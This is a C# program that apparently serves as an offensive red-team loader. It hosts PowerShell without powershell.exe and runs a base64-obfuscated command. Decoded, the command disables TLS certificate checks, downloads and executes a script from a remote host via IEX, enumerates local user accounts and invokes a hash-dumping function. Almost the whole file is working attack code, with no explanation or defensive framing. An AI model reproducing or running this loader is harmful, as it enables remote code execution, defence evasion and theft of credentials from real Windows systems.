using System;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;

namespace UnmanagedPowerShell
{
    class Program
    {
        static void Main(string[] args)
        {

            string b64_cmd = "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0ge3skdHJ1ZX19OyBJRVgoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vMTkyLjE2OC4xLjczL2tSZFhvbmRSU2MiKTsgR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfVXNlckFjY291bnQgLUZpbHRlciAgIkxvY2FsQWNjb3VudD0nVHJ1ZSciIHwgU2VsZWN0LU9iamVjdCBOYW1lOyBXcml0ZS1PdXRwdXQgYG47IEludm9rZS1HZXRIYXNo";

            var base64EncodedBytes = System.Convert.FromBase64String(b64_cmd);
            string cmd = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(cmd);

            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }

            Console.WriteLine(stringBuilder.ToString().Trim());
            return;
        }
    }
}
